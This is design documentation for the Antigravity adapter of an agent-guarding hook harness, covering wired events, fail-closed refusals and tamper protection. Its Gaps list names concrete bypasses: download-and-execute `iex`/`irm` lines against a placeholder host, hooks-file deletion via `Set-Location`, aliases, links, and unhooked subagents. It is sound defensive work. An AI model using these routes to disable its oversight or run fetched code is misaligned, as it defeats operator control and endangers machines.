---
type: Provider
title: "Antigravity provider"
description: "The Antigravity adapter — the CLI (agy 1.2.14) as the one surface the floor is claimed for, the three wired events, the fail-closed posture that turns every harness failure into a refusal, recovery from the shared global hooks file, what is not supported, and the gaps nobody measured."
tags: [provider, antigravity, fail-closed]
timestamp: "2026-09-30"
---

# Antigravity provider

Source: `src/providers/antigravity/`. Decision record: [/decisions/ad-156.md](/decisions/ad-156.md).

## Surfaces

| Surface | Floor |
| --- | --- |
| Antigravity CLI (`agy` 1.2.14) | enforced — the only surface this provider claims |
| Antigravity IDE 2.0.2 | unverified |
| Antigravity app 2.18.1 | unverified |

`tlc harness status` and `tlc harness doctor` print the same claim:
`CLI: floor enforced; IDE 2.0.2: unverified; app 2.18.1: unverified`. The IDE and the app read the same global
hooks file as the CLI, but no payload from either was ever captured, so nothing here says the floor holds there.

## Detection

`antigravity.detect.ts`: a raw hook payload is Antigravity's when it is an object with a string
`conversationId`, an array `workspacePaths` and a string `transcriptPath`. Detection alone does not make an
invocation Antigravity's: the argv token after the handler must also start with `antigravity:` (see Failure
posture below).

The host counts as installed when `~/.gemini/antigravity-cli` exists. `~/.gemini` alone is not enough — other
products of the same vendor create it.

## Capability descriptor

`antigravity.capabilities.ts`:

<!-- generated:capabilities -->

| Capability | Value |
|---|---|
| `enforcesHooks` | `true` |
| `askSupportedOn` | `[]` |
| `sessionEnv` | `false` |
| `nativeLoopCounter` | `false` |
| `dedicatedShellEvent` | `false` |
| `toolInputRewrite` | `false` |
| `toolOutputRewriteOn` | `[]` |
| `contextAtToolBefore` | `false` |
| `contextAtToolAfter` | `false` |
| `contextAtStop` | `false` |
| `sessionStartContextReliable` | `false` |
| `toolOutputAtAfter` | `false` |
| `usageInPayload` | `false` |
| `effortSignal` | `false` |
| `thoughtEvent` | `false` |

<!-- /generated -->

## Policy defaults

`antigravity.policy-defaults.ts` supplies no model allowlist and no blocked patterns, like the other providers
([/decisions/ad-011.md](/decisions/ad-011.md)).

## Wired events

Three hook events are wired, each with a prefixed token after the handler:

| Host event | Handler | Token | Matcher | Timeout |
| --- | --- | --- | --- | --- |
| `PreToolUse` | `tool-before` | `antigravity:PreToolUse` | `.*` | 10 s |
| `PostToolUse` | `tool-after` | `antigravity:PostToolUse` | `.*` | 10 s |
| `Stop` | `stop` | `antigravity:Stop` | — | 120 s |

The prefix exists because `PreToolUse`, `PostToolUse` and `Stop` are also Claude Code's event names; a bare
token would let a hand-written Claude hook select this host's posture. `PreInvocation` and `PostInvocation`
are not wired.

## Event mapping

`antigravity.inbound.ts` maps Antigravity's own hook names to `HarnessEventKind`:

<!-- generated:event-mapping -->

| Hook | Fan-out rule | HarnessEventKind |
|---|---|---|
| `Stop` | — | `stop` |
| `PreToolUse` | tool_name === "view_file" | `read.before` |
| `PreToolUse` | tool_name === "run_command" | `shell.before` |
| `PostToolUse` | tool_name === "write_to_file" | `edit.after` |
| `PostToolUse` | tool_name === "replace_file_content" | `edit.after` |
| `PostToolUse` | tool_name === "run_command" | `shell.after` |

<!-- /generated -->

The tool table in `antigravity.tools.ts` is the only place in the repository that names this host's tools:

| Native tool | Canonical name | Before | After | Fields read |
| --- | --- | --- | --- | --- |
| `view_file` | `Read` | `read.before` | `tool.after` | `AbsolutePath` |
| `write_to_file` | `Write` | `tool.before` | `edit.after` | `TargetFile`, `CodeContent` |
| `replace_file_content` | `Edit` | `tool.before` | `edit.after` | `TargetFile`, `TargetContent`, `ReplacementContent` |
| `multi_replace_file_content` | `MultiEdit` (unverified) | `tool.before` | `tool.after` | `TargetFile` only |
| `run_command` | — | `shell.before` | `shell.after` | `CommandLine`, `Cwd` |
| `invoke_subagent` | `Task` | `tool.before` | `tool.after` | the subagent type, only when exactly one is spawned |

A tool not in this table passes with its native name, and the floor refuses it as `wiring-tamper` when any
string of its arguments names either hooks file (G-7).

## Wiring target

`antigravity.wiring.ts` writes one root key, `tlc-harness`, into `~/.gemini/config/hooks.json`
(strategy `named-group`). Every other key in that file is the operator's: install keeps their values and their
order, and a second install with the same runtime leaves the file byte-identical. Install refuses a launcher
path containing a space, and refuses to touch a file that is not a JSON object. Quoting does not help: on `agy`
1.2.14 quotes are not shell quoting — the host splits the hook command on spaces, a quote stays a literal
character in the argument, and the hook's working directory is the directory of the hooks.json file (measured on
2026-09-30, including under `cmd.exe /d /s /c`).

Install, update and init never write the workspace `.agents/hooks.json` nor
`~/.gemini/antigravity-cli/settings.json`. `tlc harness init` says so when the host is present.

Both hooks files are protected wiring targets for **every** provider: the global file, and
`<projectDir>/.agents/hooks.json` for the event's own project. A `Write`, `Edit` or `MultiEdit` to either, from
any host, is refused as `wiring-tamper`; outside Antigravity that refusal compares the textual path (G-12).
Reading them with `view_file` or `Read` stays allowed.

In an Antigravity event the floor also receives this host's facts through the port
([/decisions/ad-157.md](/decisions/ad-157.md)): a `run_command` resolves relative operands against its `Cwd`, and
a `Cwd` carrying `$`, `%` or a backtick is judged as unresolvable; destroying, moving or renaming `.agents`,
`~/.gemini/config` or `~/.gemini` is `wiring-tamper`; the comparison with both files and those directories
ignores case; and on Windows the shell route compares the alias-free form of both sides.

## Failure posture

This host reads an empty hook stdout as permission and `{}` as a refusal — the opposite of Cursor and Claude
Code. Under an `antigravity:` token, every harness failure is an explicit refusal with exit 0:

| Cause | Output |
| --- | --- |
| the launcher's runtime cannot run, the child does not start, exits non-zero or ends without an output the event accepts | `{"decision":"deny","reason":"tlc-harness: launcher-error"}` |
| the child does not finish two seconds before the host's timeout (8 s, 8 s, 118 s) | `{"decision":"deny","reason":"tlc-harness: timeout"}` |
| stdin is empty, blank or not JSON | `{"decision":"deny","reason":"tlc-harness: invalid-stdin"}` |
| valid JSON that no provider detects, another provider detects, or this adapter does not translate | `{"decision":"deny","reason":"tlc-harness: unrecognized-payload"}` |
| the handler throws | `{"decision":"deny","reason":"tlc-harness: handler-error"}` |

The reason never carries a path, an environment value or parse detail. The detail goes to stderr, and a
diagnostic reaches disk only under the payload's `workspacePaths[0]`, never under the hook's working
directory. Cursor and Claude Code keep their fail-open behaviour.

A decision the harness did make renders by event:

| Decision | `PreToolUse` | `PostToolUse` and `Stop` |
| --- | --- | --- |
| `abstain`, `allow`, `context`, `continue`, rewritten output | `{"decision":"allow"}` | empty stdout (zero bytes), exit 0 |
| `deny`, and the `ask` and rewritten input this host has no channel for | a deny carrying the reason | a deny carrying the reason |

Before a tool, abstain renders `{"decision":"allow"}`, because empty stdout already means allow there and there
is no neutral output; the provider conformance test "abstain never renders anything that reads as an approval"
matches the other hosts' approval keys and does not catch this shape. After a tool and at `Stop`, the host reads
any JSON as the tool's result or a verdict: measured on `agy` 1.2.14, `{"decision":"allow"}` after a tool
replaced the tool's result with `unknown field "decision"`. Success there is therefore empty stdout, which opens
nothing — the floor refuses before the tool, and the after-event arrives once the tool has run. `{}` is never
produced on any event, `{"decision":"allow"}` is never produced after a tool or at `Stop`, and empty stdout is
never produced before a tool. A hook child that exits 0 with empty stdout is success after a tool and at `Stop`,
and a `launcher-error` before a tool.

## Recovery

The global file is shared with the IDE and the app. With the group in place, a surface nobody verified, or
a CLI newer than 1.2.14 that sends another payload, can fire the group and have **every tool denied** with
`unrecognized-payload` or `invalid-stdin`. The doctor cannot see the IDE or the app: a surface that never
fires sends no payload to inspect.

- **Primary recovery:** remove only the `"tlc-harness"` key from `~/.gemini/config/hooks.json`, in an editor or
  terminal outside `agy`, or delete the file when that key is the only one. It needs neither Node nor the
  harness runtime and touches no other host.
- **Last resort:** `tlc harness uninstall --yes`. It also removes the Claude and Cursor harness hooks, the
  `harness-init` skill links, `tlc` from PATH and `~/.tlc/harness` — the floor leaves every host on the
  machine, not just this one.

Install and a healthy `tlc harness doctor` print the warning, the primary recovery and the reach of the last
resort every time the group is in place.

## Not supported

`ask`, `force_ask`, `deny_unless_prior_grant`, `permissionOverrides`, `continue` on `Stop`, and the
`PreInvocation` and `PostInvocation` events.

## Gaps

- Hooks inside a subagent were measured in spike S3, on CLI 1.2.14, with the group in the workspace
  `.agents/hooks.json`: the subagent's tools fire neither `PreToolUse` nor `PostToolUse`. The global group in
  `~/.gemini/config/hooks.json`, where `tlc harness install` writes the floor, was measured with a subagent on
  CLI 1.2.14 on 2026-09-30: only the parent's tools fired, and the subagent's `view_file` and `send_message`
  fired neither `PreToolUse` nor `PostToolUse`. Do not count on the floor for subagents.
- Measured limitation: CLI 1.2.14 in print mode did not load a configured MCP server (`MCP_UNAVAILABLE`, log
  `empty component: prompt section "mcp_servers"`), and no MCP tool payload was captured.
- Measured limitation: CLI 1.2.14 in print mode did not offer `multi_replace_file_content` in two sessions; the
  editing tools available were `write_to_file` and `replace_file_content`. The mapping stays unverified and its
  fixture stays synthetic: its arguments are assumed from its single-edit sibling, and only the path is read.
- Measured limitation: the IDE 2.0.2 and the app 2.18.1 are installed but made no tool call, so `Stop` and
  `PostToolUse` were not measured on them.
- G-1: a shell path built from an environment variable is not resolved (`$env:`, `$HOME`).
- G-2: a download handed to `Invoke-Expression` by a means that is not a fetch verb is not recognized
  (`DownloadString`, `Start-BitsTransfer`). Not every download by a fetch verb is recognized either — see G-16.
- G-3: the content of a script run by `-File` or `Invoke-Command -FilePath` is not inspected, like `sh ./x.sh`.
- G-4: `Get-Content ./x.ps1 | iex`, and downloading to a file and then running it, are allowed, like `sh ./x.sh`.
- G-5: the arguments of `Start-Process` (`-ArgumentList`) and a parameter value before the executable are not
  inspected.
- G-6: .NET methods (`[IO.File]`), WMI/CIM (`Invoke-CimMethod`) and COM objects are not recognized.
- G-7: a tool outside the translation table is checked only by the `textual` name of the two hooks.json files,
  with no canonical form.
- G-8: the `Cwd` base applies only to `run_command`. With an unresolvable `Cwd`, a read or a write through a
  relative operand of a verb that neither destroys nor moves or renames, in a command that does not name
  `hooks.json`, is not refused.
- G-9: the project root is not a protected ancestor, and an operand with a glob is resolved as literal text
  (`.\*`).
- G-10: indirection through an alias, a function, a variable or a name computed in a string expression is not
  recognized (`Set-Alias`, `'Re'+'move-Item'`).
- G-11: a writer that reaches a hooks.json file through the directory that holds it, without being a
  destructive, move or rename verb, is not refused (`robocopy`, `Expand-Archive`).
- G-12: in a Cursor or Claude session, case, protected ancestors, textual names, `Cwd` and the canonical form on
  the shell route do not apply, so `Remove-Item -Recurse -Force .agents` or `rm ./.AGENTS/hooks.json` is not
  refused as `wiring-tamper` (`.AGENTS`).
- G-13: the `\\?\UNC\` prefix and hardlinks are not resolved, neither in the write tools nor on the shell route
  and `Cwd`.
- G-14: a directory change inside the command itself (`cd`, `chdir`, `Set-Location`, `sl`, `Push-Location`,
  `pushd`) does not change the base of the relative operands of the following segments, which stay resolved
  against the `run_command` `Cwd` or the project, so `Set-Location .agents; Remove-Item -Force .\hooks.json` is
  not refused.
- G-15: a directory link (junction or symlink) created in one segment and used in a following segment of the
  same command is not resolved (`mklink`), because only a link that exists when the decision is made is followed.
- G-16: a fetch verb in the argument of `Invoke-Expression` is recognized in two positions only: as the first
  name of a following word of the same `iex` segment, or of the rest of the head word after its first `(`
  (`iex(irm …`); and as the head of the segment right after an `iex` segment whose last word ends in `(`, like the
  `(` that an `&` splits off in `iex (& irm …)`. Both positions also hold for an `iex` inside executed text, like
  `pwsh -c "iex (& irm …)"`. In any other position of the argument it is not recognized, so
  `iex ([string](irm https://example.invalid/x))`, `iex (& { irm https://example.invalid/x })` and
  `iex $(& { irm https://example.invalid/x })` are not refused, the last because the first name falls on `{`
  (`[string](irm`, `& { irm`).
- Only the `.agents/hooks.json` of `workspacePaths[0]` is protected; the other roots of a multi-root workspace
  are not.
- `define_subagent` can turn on `enable_write_tools`, and the floor sees it as a generic tool.
- Stop may run twice per execution loop; there is no deduplication.
- The effect of a deny on `Stop` was not measured.
- Two differently named hooks, one in the global file and one in the workspace file, both fire, about 90 ms
  apart; the same name `tlc-harness` in both files was not measured.
- A `tlc-harness` hook with `enabled: false` in the workspace `.agents/hooks.json` might disable the global
  group; this was not measured, and the doctor does not read the workspace file.
- `allow` in an interactive session was not measured.
- A payload change in a CLI newer than 1.2.14 was not measured. The stdin captures are from 1.2.13; 1.2.14
  payloads were seen only in spike S3 and in the end-to-end proof.
- A launcher path containing a space is not supported: on `agy` 1.2.14 quotes are not shell quoting — the
  command is split on spaces, a quote stays literal, and the hook's working directory is the directory of the
  hooks.json file (measured on 2026-09-30, including under `cmd.exe /d /s /c`).
- The hook inherits environment variables whose names look like credentials.
- `~/.gemini/antigravity-cli/settings.json` and plugin hooks are not protected.
- The harness's `allow` does not grant the host's own headless permission for `run_command`.
- `--dangerously-skip-permissions` keeps the hooks running.
- Reading a protected hooks file through a PowerShell cmdlet — `Get-Content ./.agents/hooks.json` in a
  `run_command` — is refused as `wiring-tamper`, because a cmdlet is not a proven reader. `view_file` is allowed.

## See also

- [/providers/index.md](/providers/index.md)
- [/decisions/ad-156.md](/decisions/ad-156.md)
- [/decisions/ad-101.md](/decisions/ad-101.md)
